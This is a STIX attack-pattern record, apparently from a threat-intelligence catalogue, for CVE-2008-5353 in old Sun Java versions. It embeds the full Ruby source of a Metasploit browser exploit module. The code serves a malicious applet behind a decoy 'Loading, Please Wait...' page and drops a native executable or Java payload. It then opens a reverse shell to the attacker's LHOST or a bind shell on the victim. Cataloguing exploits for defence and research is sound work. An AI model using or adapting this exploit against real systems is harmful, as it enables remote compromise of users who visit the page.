{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1cb35e32-8907-481b-a943-50cc863229e8",
    "created": "2024-08-14T17:05:27.394755Z",
    "modified": "2024-08-14T17:05:27.394759Z",
    "name": "Sun Java Calendar Deserialization Privilege Escalation",
    "description": " This module exploits a flaw in the deserialization of Calendar objects in the Sun JVM.  The payload can be either a native payload which is generated as an executable and dropped/executed on the target or a shell from within the Java applet in the target browser.  The affected Java versions are JDK and JRE 6 Update 10 and earlier, JDK and JRE 5.0 Update 16 and earlier, SDK and JRE 1.4.2_18 and earlier (SDK and JRE 1.3.1 are not affected).  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_calendar_deserialize.rb",
            "external_id": "java_calendar_deserialize.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-5353"
        },
        {
            "source_name": "reference",
            "url": "http://slightlyrandombrokenthoughts.blogspot.com/2008/12/calendar-bug.html"
        },
        {
            "source_name": "reference",
            "url": "http://landonf.bikemonkey.org/code/macosx/CVE-2008-5353.20090519.html"
        },
        {
            "source_name": "reference",
            "url": "http://blog.cr0.org/2009/05/write-once-own-everyone.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  # Superceded by java_atomicreferencearray\n  # include Msf::Exploit::Remote::BrowserAutopwn\n  # autopwn_info({ :javascript => false })\n\n  def initialize(info = {})\n    super(\n      update_info(info,\n      'Name'          => 'Sun Java Calendar Deserialization Privilege Escalation',\n      'Description'   => %q{\n        This module exploits a flaw in the deserialization of Calendar objects in the Sun JVM.\n\n        The payload can be either a native payload which is generated as an executable and\n        dropped/executed on the target or a shell from within the Java applet in the target browser.\n\n        The affected Java versions are JDK and JRE 6 Update 10 and earlier, JDK and JRE 5.0 Update 16\n        and earlier, SDK and JRE 1.4.2_18 and earlier (SDK and JRE 1.3.1 are not affected).\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => [ 'sf', 'hdm' ],\n      'References'    =>\n      [\n        [ 'CVE', '2008-5353' ],\n        [ 'OSVDB', '50500'],\n        [ 'URL', 'http://slightlyrandombrokenthoughts.blogspot.com/2008/12/calendar-bug.html' ],\n        [ 'URL', 'http://landonf.bikemonkey.org/code/macosx/CVE-2008-5353.20090519.html' ],\n        [ 'URL', 'http://blog.cr0.org/2009/05/write-once-own-everyone.html' ]\n      ],\n      'Platform'      => %w(linux osx solaris win),\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Platform' => ['java'],\n              'Arch' => ARCH_JAVA\n            }\n          ],\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Mac OS X PPC (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_PPC\n            }\n          ],\n          [ 'Mac OS X x86 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86\n            }\n          ],\n          [ 'Linux x86 (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-12-03'\n      )\n    )\n  end\n\n  def exploit\n    # load the static jar file\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2008-5353.jar\")\n    fd = File.open(path, \"rb\")\n    @jar_data = fd.read(fd.stat.size)\n    fd.close\n\n    super\n  end\n\n  def on_request_uri(cli, request)\n    data = nil\n    host = nil\n    port = nil\n\n    if !request.uri.match(/\\.jar$/i)\n      if !request.uri.match(/\\/$/)\n        send_redirect(cli, get_resource + '/', '')\n        return\n      end\n\n      print_status(\"#{name} handling request\")\n\n      payload = regenerate_payload(cli)\n      if !payload\n        print_error(\"Failed to generate the payload.\")\n        return\n      end\n\n      if target.name == 'Generic (Java Payload)'\n        if datastore['LHOST']\n          jar  = payload.encoded\n          host = datastore['LHOST']\n          port = datastore['LPORT']\n          print_status(\"Payload will be a Java reverse shell\")\n        else\n          port = datastore['LPORT']\n          host = cli.peerhost\n          print_status(\"Payload will be a Java bind shell\")\n        end\n        if jar\n          print_status(\"Generated jar to drop (#{jar.length} bytes).\")\n          jar = Rex::Text.to_hex(jar, prefix = \"\")\n        else\n          print_error(\"Failed to generate the executable.\")\n          return\n        end\n      else\n\n        # NOTE: The EXE mixin automagically handles detection of arch/platform\n        data = generate_payload_exe\n\n        print_status(\"Generated executable to drop (#{data.length} bytes).\")\n        data = Rex::Text.to_hex(data, prefix = \"\")\n\n      end\n\n      send_response_html(cli, generate_html(data, jar, host, port), 'Content-Type' => 'text/html')\n      return\n    end\n\n    print_status(\"Sending Applet.jar\")\n    send_response(cli, generate_jar, 'Content-Type' => \"application/octet-stream\")\n\n    handler(cli)\n  end\n\n  def generate_html(data, jar, host, port)\n    html  = \"<html><head><title>Loading, Please Wait...</title></head>\"\n    html += \"<body><center><p>Loading, Please Wait...</p></center>\"\n    html += \"<applet archive=\\\"Applet.jar\\\" code=\\\"msf.x.AppletX.class\\\" width=\\\"1\\\" height=\\\"1\\\">\"\n    html += \"<param name=\\\"data\\\" value=\\\"#{data}\\\"/>\" if data\n    html += \"<param name=\\\"jar\\\" value=\\\"#{jar}\\\"/>\" if jar\n    html += \"<param name=\\\"lhost\\\" value=\\\"#{host}\\\"/>\" if host\n    html += \"<param name=\\\"lport\\\" value=\\\"#{port}\\\"/>\" if port\n    html += \"</applet></body></html>\"\n    html\n  end\n\n  def generate_jar\n    @jar_data\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-12-03",
    "x_mitre_platforms": [
        "linux'"
    ]
}